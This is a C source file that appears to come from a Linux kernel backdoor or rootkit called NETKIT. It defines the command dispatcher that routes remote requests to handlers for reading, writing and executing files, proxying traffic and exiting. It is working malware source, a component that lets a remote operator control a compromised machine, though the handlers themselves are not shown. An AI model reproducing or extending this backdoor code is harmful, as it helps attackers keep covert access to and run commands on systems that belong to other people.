#include <linux/types.h>

#include "cmd.h"

#include "handlers.h"
#include "../packet/packet.h"
#include "../../sys/mem.h"
#include "../../sys/debug.h"

static int (*COMM_HANDLERS[])(const struct packet_req*, u8**, size_t*) = {
    cmd_handle_file_read,
    cmd_handle_file_write,
    cmd_handle_file_exec,
    cmd_handle_proxy,
    cmd_handle_exit
};

/**
 * Handles the request (based on command id etc)
 */
int cmd_process(const struct packet_req *req_packet, u8 **res_buf, size_t *res_buflen)
{
    NETKIT_LOG("[*] processing cmd (cmd_id: %d)\n", req_packet->cmd_id);

    if (req_packet->cmd_id < 0 || req_packet->cmd_id >= sizeof(COMM_HANDLERS) / sizeof(*COMM_HANDLERS))
        return -EDOM;

    return COMM_HANDLERS[req_packet->cmd_id](req_packet, res_buf, res_buflen);
}